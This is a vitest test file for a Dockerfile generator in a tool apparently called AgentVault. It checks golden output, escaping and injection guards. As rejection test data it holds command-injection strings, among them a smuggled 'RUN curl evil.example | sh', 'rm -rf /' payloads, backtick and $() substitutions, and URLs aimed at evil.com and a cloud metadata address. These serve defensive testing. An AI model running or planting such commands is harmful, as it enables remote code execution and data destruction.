import { describe, expect, it } from 'vitest';
import {
  dockerQuote,
  hasControlChars,
  healthcheckForUrl,
  printable,
  renderDockerfile,
  type DockerfileInput,
  type InstallPlan,
} from '../../src/container/dockerfile.js';
import { manifestToLabel, type ContainerManifest } from '../../src/container/manifest.js';
import { ContainerError } from '../../src/container/types.js';

const HASH = 'a'.repeat(64);

function manifest(overrides: Partial<ContainerManifest> = {}): ContainerManifest {
  return {
    schemaVersion: 1,
    name: 'demo',
    version: '1.2.3',
    runtime: 'node',
    entrypoint: ['node', 'index.js'],
    volumes: ['/data'],
    env: [],
    secrets: [],
    isolation: { network: 'none', user: '10001:10001', readOnlyRootfs: true },
    source: { type: 'generic', contentHash: HASH },
    ...overrides,
  };
}

function render(m: ContainerManifest, install: InstallPlan = 'npm-install', base = 'node:22-slim'): string {
  return renderDockerfile({ manifest: m, base, install } satisfies DockerfileInput);
}

/** The Dockerfile lexer's handling of a double-quoted word (the part LABEL relies on). */
function unquoteDockerWord(quoted: string): string {
  expect(quoted.startsWith('"') && quoted.endsWith('"')).toBe(true);
  const body = quoted.slice(1, -1);
  let out = '';
  for (let i = 0; i < body.length; i++) {
    const ch = body.charAt(i);
    if (ch === '$') throw new Error('unescaped $ would be expanded by the Dockerfile parser');
    if (ch === '"') throw new Error('unescaped quote would end the word');
    if (ch === '\\') {
      const next = body.charAt(i + 1);
      if (next === '"' || next === '$' || next === '\\') {
        out += next;
        i++;
        continue;
      }
    }
    out += ch;
  }
  return out;
}

function labelValue(dockerfile: string, key: string): string {
  const line = dockerfile.split('\n').find((l) => l.startsWith(`LABEL ${key}=`));
  expect(line, `LABEL ${key}`).toBeDefined();
  return unquoteDockerWord((line as string).slice(`LABEL ${key}=`.length));
}

describe('renderDockerfile golden output', () => {
  it('renders the node + npm ci layout exactly', () => {
    const m = manifest({
      volumes: ['/data', '/memory'],
      env: ['MODEL'],
      secrets: ['anthropic'],
      healthcheck: { test: healthcheckForUrl('node', 'http://localhost:8080/health'), intervalSec: 30, timeoutSec: 5, retries: 3, startPeriodSec: 10 },
      isolation: { network: 'proxy', user: '10001:10001', readOnlyRootfs: true },
    });
    const text = render(m, 'npm-ci');
    const expectedHead = [
      '# Generated by AgentVault. Do not edit: regenerate with `agentvault package`.',
      'FROM node:22-slim',
      'ENV NODE_ENV=production',
      'ENV HOME=/home/agent',
      'RUN groupadd --gid 10001 agent && useradd --uid 10001 --gid 10001 --home-dir /home/agent --no-create-home --shell /usr/sbin/nologin agent',
      'RUN mkdir -p -- /home/agent /data /memory && chown 10001:10001 -- /home/agent /data /memory',
      'WORKDIR /app',
      'COPY package.json package-lock.json ./',
      'RUN npm ci --omit=dev --ignore-scripts --no-audit --no-fund && npm cache clean --force',
      'COPY . /app',
    ];
    const lines = text.split('\n');
    expect(lines.slice(0, expectedHead.length)).toEqual(expectedHead);
    expect(lines.slice(expectedHead.length)).toEqual([
      `LABEL agentvault.manifest=${dockerQuote(manifestToLabel(m))}`,
      `LABEL agentvault.source-hash="${HASH}"`,
      'LABEL agentvault.base="node:22-slim"',
      'USER 10001:10001',
      'HEALTHCHECK --interval=30s --timeout=5s --start-period=10s --retries=3 CMD ["node","-e","fetch(\\"http://localhost:8080/health\\",{signal:AbortSignal.timeout(4000)}).then(r=>process.exit(r.ok?0:1),()=>process.exit(1))"]',
      'CMD ["node","index.js"]',
      '',
    ]);
  });

  it('renders the python + requirements.txt layout exactly', () => {
    const m = manifest({ runtime: 'python', entrypoint: ['python', 'main.py'] });
    const text = render(m, 'pip-requirements', 'python:3.12-slim');
    expect(text.split('\n').filter((l) => !l.startsWith('LABEL '))).toEqual([
      '# Generated by AgentVault. Do not edit: regenerate with `agentvault package`.',
      'FROM python:3.12-slim',
      'ENV PYTHONUNBUFFERED=1',
      'ENV PYTHONDONTWRITEBYTECODE=1',
      'ENV HOME=/home/agent',
      'RUN groupadd --gid 10001 agent && useradd --uid 10001 --gid 10001 --home-dir /home/agent --no-create-home --shell /usr/sbin/nologin agent',
      'RUN mkdir -p -- /home/agent /data && chown 10001:10001 -- /home/agent /data',
      'WORKDIR /app',
      'COPY requirements.txt ./',
      'RUN pip install --no-cache-dir -r requirements.txt',
      'COPY . /app',
      'USER 10001:10001',
      'CMD ["python","main.py"]',
      '',
    ]);
  });

  it('uses npm install without a lockfile and installs the project only after the full copy for pyproject', () => {
    const noLock = render(manifest(), 'npm-install').split('\n');
    expect(noLock).toContain('COPY package.json ./');
    expect(noLock).toContain('RUN npm install --omit=dev --ignore-scripts --no-audit --no-fund && npm cache clean --force');

    const proj = render(manifest({ runtime: 'python', entrypoint: ['python', 'main.py'] }), 'pip-project', 'python:3.12-slim').split('\n');
    expect(proj.some((l) => l.startsWith('COPY ') && l !== 'COPY . /app')).toBe(false);
    expect(proj.indexOf('RUN pip install --no-cache-dir .')).toBeGreaterThan(proj.indexOf('COPY . /app'));
  });

  it('copies dependency manifests before the rest of the source (layer caching)', () => {
    const lines = render(manifest(), 'npm-ci').split('\n');
    expect(lines.indexOf('COPY package.json package-lock.json ./')).toBeLessThan(lines.indexOf('COPY . /app'));
    expect(lines.findIndex((l) => l.startsWith('RUN npm ci'))).toBeLessThan(lines.indexOf('COPY . /app'));
  });

  it('is deterministic', () => {
    expect(render(manifest(), 'npm-ci')).toBe(render(manifest(), 'npm-ci'));
  });

  it('creates and chowns every volume once, and /home/agent', () => {
    const text = render(manifest({ volumes: ['/data', '/memory', '/data', '/home/agent'] }));
    expect(text).toContain('RUN mkdir -p -- /home/agent /data /memory && chown 10001:10001 -- /home/agent /data /memory');
  });

  it('puts USER before CMD and never runs as root', () => {
    const lines = render(manifest()).split('\n');
    expect(lines.indexOf('USER 10001:10001')).toBeGreaterThan(-1);
    expect(lines.indexOf('USER 10001:10001')).toBeLessThan(lines.findIndex((l) => l.startsWith('CMD ')));
  });
});

describe('renderDockerfile carries no user-supplied values except the manifest label', () => {
  const hostile = manifest({
    name: 'demo',
    entrypoint: ['node', 'index.js', '--x=$(touch /pwned)', '`id`', "'; rm -rf / #", '"q"'],
    env: ['API_KEY', 'MODEL'],
    secrets: ['anthropic'],
  });
  const text = render(hostile, 'npm-ci');
  const lines = text.split('\n');

  it('has no ARG and only fixed ENV constants', () => {
    expect(lines.filter((l) => l.startsWith('ARG '))).toEqual([]);
    expect(lines.filter((l) => l.startsWith('ENV '))).toEqual(['ENV NODE_ENV=production', 'ENV HOME=/home/agent']);
  });

  it('puts env and secret NAMES nowhere but the label', () => {
    const outsideLabel = lines.filter((l) => !l.startsWith('LABEL agentvault.manifest=')).join('\n');
    expect(outsideLabel).not.toContain('API_KEY');
    expect(outsideLabel).not.toContain('anthropic');
  });

  it('emits only the three known labels', () => {
    expect(lines.filter((l) => l.startsWith('LABEL ')).map((l) => l.split('=')[0])).toEqual([
      'LABEL agentvault.manifest',
      'LABEL agentvault.source-hash',
      'LABEL agentvault.base',
    ]);
  });

  it('keeps shell metacharacters in the entrypoint inert in exec-form CMD', () => {
    const cmd = lines.find((l) => l.startsWith('CMD '));
    expect(cmd).toBe(`CMD ${JSON.stringify(hostile.entrypoint)}`);
    expect(JSON.parse((cmd as string).slice(4))).toEqual(hostile.entrypoint);
    expect(lines.filter((l) => /^(RUN|ENTRYPOINT|SHELL)\b/.test(l)).join('\n')).not.toContain('pwned');
  });

  it('every line starts with a known instruction or the header comment', () => {
    for (const line of lines.filter(Boolean)) {
      expect(line).toMatch(/^(# Generated by AgentVault\.|(FROM|ENV|RUN|WORKDIR|COPY|LABEL|USER|HEALTHCHECK|CMD) )/);
    }
  });
});

describe('renderDockerfile label round-trip', () => {
  const tricky = manifest({
    entrypoint: ['node', 'index.js', '--g=$HOME ${X} $(id) `id` "q" \\x \\$Y \\\\ é', "it's"],
  });

  it('escapes $ so the Dockerfile parser cannot expand it', () => {
    const text = render(tricky);
    expect(text).toContain('\\$HOME');
    expect(labelValue(text, 'agentvault.manifest')).toBe(manifestToLabel(tricky));
  });

  it('dockerQuote output survives an emulated lexer for awkward characters', () => {
    for (const s of ['plain', '$', '$$', '\\$', '\\', '"', '\\"', 'a b', '${HOME}', '$(id)', '`x`', 'é✓']) {
      expect(unquoteDockerWord(dockerQuote(s))).toBe(s);
    }
  });

  it('a mutation that skips the $ escape is detected by the emulated lexer', () => {
    const unescaped = JSON.stringify('--g=$HOME');
    expect(() => unquoteDockerWord(unescaped)).toThrow(/unescaped \$/);
  });

  it('labels the source hash and base image', () => {
    const text = render(manifest(), 'npm-install', 'node:20-slim');
    expect(labelValue(text, 'agentvault.source-hash')).toBe(HASH);
    expect(labelValue(text, 'agentvault.base')).toBe('node:20-slim');
  });
});

describe('renderDockerfile injection guards', () => {
  const expectRejected = (fn: () => unknown, code: string = 'INVALID_INPUT'): void => {
    try {
      fn();
    } catch (err) {
      expect(err).toBeInstanceOf(ContainerError);
      expect((err as ContainerError).code).toBe(code);
      return;
    }
    throw new Error('expected renderDockerfile to throw');
  };

  it('rejects a newline in an entrypoint argument (would start a new instruction)', () => {
    expectRejected(() => render(manifest({ entrypoint: ['node', 'index.js\nRUN curl evil.example | sh'] })));
  });

  it.each(['\r', '\t', '\0', '\u001b', '\u0085', ' '])('rejects control character %j in an entrypoint argument', (ch) => {
    expectRejected(() => render(manifest({ entrypoint: ['node', `a${ch}b`] })));
  });

  it('rejects control characters in healthcheck arguments', () => {
    expectRejected(() => render(manifest({ healthcheck: { test: ['node', '-e', 'x\ny'] } })));
  });

  it('rejects a newline in the agent name, env names and secret names (schema)', () => {
    expectRejected(() => render(manifest({ name: 'demo\nRUN id' })));
    expectRejected(() => render(manifest({ env: ['A\nRUN id'] })));
    expectRejected(() => render(manifest({ env: ['$(id)'] })));
    expectRejected(() => render(manifest({ env: ['A`id`'] })));
    expectRejected(() => render(manifest({ secrets: ['a\nb'] })));
  });

  it('rejects hostile volume paths', () => {
    expectRejected(() => render(manifest({ volumes: ['/data; rm -rf /'] })));
    expectRejected(() => render(manifest({ volumes: ['/data\nRUN id'] })));
    expectRejected(() => render(manifest({ volumes: ['/data/../etc'] })));
    expectRejected(() => render(manifest({ volumes: ['/'] })));
  });

  it('rejects hostile base images', () => {
    for (const base of ['node:22 AS x\nRUN id', 'node:22 --platform=x', '-evil', 'node$(id)', '', 'node:22\n']) {
      expectRejected(() => render(manifest(), 'npm-install', base));
    }
  });

  it('rejects huge values instead of rendering them', () => {
    expectRejected(() => render(manifest({ entrypoint: ['node', 'x'.repeat(5000)] })));
    expectRejected(() => render(manifest({ entrypoint: Array.from({ length: 65 }, () => 'a') })));
    expectRejected(() => render(manifest({ env: Array.from({ length: 65 }, (_v, i) => `V${i}`) })));
    expectRejected(() => render(manifest({ name: 'n'.repeat(41) })));
  });

  it('refuses root: uid 0, gid 0, and an unparsable user', () => {
    expectRejected(() => render(manifest({ isolation: { network: 'none', user: '0:0', readOnlyRootfs: true } })), 'POLICY_VIOLATION');
    expectRejected(() => render(manifest({ isolation: { network: 'none', user: '10001:0', readOnlyRootfs: true } })), 'POLICY_VIOLATION');
    expectRejected(() => render(manifest({ isolation: { network: 'none', user: 'root', readOnlyRootfs: true } })));
  });

  it('uses the manifest user for useradd, chown and USER', () => {
    const text = render(manifest({ isolation: { network: 'none', user: '20000:30000', readOnlyRootfs: true } }));
    expect(text).toContain('groupadd --gid 30000 agent && useradd --uid 20000 --gid 30000');
    expect(text).toContain('chown 20000:30000 --');
    expect(text).toContain('USER 20000:30000');
  });

  it('refuses an install plan that does not match the runtime', () => {
    expectRejected(() => render(manifest({ runtime: 'node' }), 'pip-requirements'));
    expectRejected(() => render(manifest({ runtime: 'python', entrypoint: ['python', 'a.py'] }), 'npm-ci', 'python:3.12-slim'));
  });

  it('refuses shell-form and disabled healthchecks, accepts a leading CMD marker', () => {
    expectRejected(() => render(manifest({ healthcheck: { test: ['CMD-SHELL', 'curl -f localhost'] } })));
    expectRejected(() => render(manifest({ healthcheck: { test: ['NONE'] } })));
    expectRejected(() => render(manifest({ healthcheck: { test: ['CMD'] } })));
    const text = render(manifest({ healthcheck: { test: ['CMD', 'node', 'check.js'], retries: 2 } }));
    expect(text).toContain('HEALTHCHECK --retries=2 CMD ["node","check.js"]');
  });
});

describe('healthcheckForUrl', () => {
  it('builds a curl-free node check with the URL as an inert JSON string', () => {
    const argv = healthcheckForUrl('node', 'http://127.0.0.1:3000/healthz');
    expect(argv.slice(0, 2)).toEqual(['node', '-e']);
    expect(argv[2]).toContain('fetch("http://127.0.0.1:3000/healthz"');
    expect(argv.join(' ')).not.toContain('curl');
    expect(hasControlChars(argv.join(' '))).toBe(false);
  });

  it('builds a curl-free python check', () => {
    const argv = healthcheckForUrl('python', 'http://localhost:8080/');
    expect(argv.slice(0, 2)).toEqual(['python', '-c']);
    expect(argv[2]).toContain('urllib.request.urlopen("http://localhost:8080/"');
    expect(hasControlChars(argv[2] as string)).toBe(false);
  });

  it('defaults the path to /', () => {
    expect(healthcheckForUrl('node', 'http://localhost:80')[2]).toContain('"http://localhost:80/"');
  });

  it.each([
    'https://localhost:8080/health',
    'http://example.com:8080/health',
    'http://localhost.evil.com:8080/',
    'http://localhost@evil.com:8080/',
    'http://localhost:0/',
    'http://localhost:65536/',
    'http://localhost:08080/',
    'http://localhost/health',
    'http://localhost:8080/a b',
    'http://localhost:8080/a?x=1',
    'http://localhost:8080/../x',
    'http://localhost:8080/"+process.exit(0)+"',
    'http://localhost:8080/\nRUN id',
    'http://169.254.169.254:80/',
    '',
  ])('rejects %j', (url) => {
    expect(() => healthcheckForUrl('node', url)).toThrow(ContainerError);
    expect(() => healthcheckForUrl('python', url)).toThrow(ContainerError);
  });

  it('feeds a valid manifest healthcheck through the renderer', () => {
    const m = manifest({ healthcheck: { test: healthcheckForUrl('node', 'http://localhost:8080/health') } });
    expect(render(m)).toMatch(/^HEALTHCHECK CMD \["node","-e","fetch\(/m);
  });
});

describe('helpers', () => {
  it('hasControlChars flags C0, DEL, C1 and line separators', () => {
    expect(hasControlChars('plain text é')).toBe(false);
    for (const s of ['\n', '\r', '\t', '\0', '\u007f', '\u0085', ' ', ' ']) {
      expect(hasControlChars(`a${s}b`)).toBe(true);
    }
  });

  it('printable masks control characters and truncates', () => {
    expect(printable('a\nb\u0000c')).toBe('a?b?c');
    expect(printable('x'.repeat(300), 10)).toBe('xxxxxxxxxx...');
  });
});
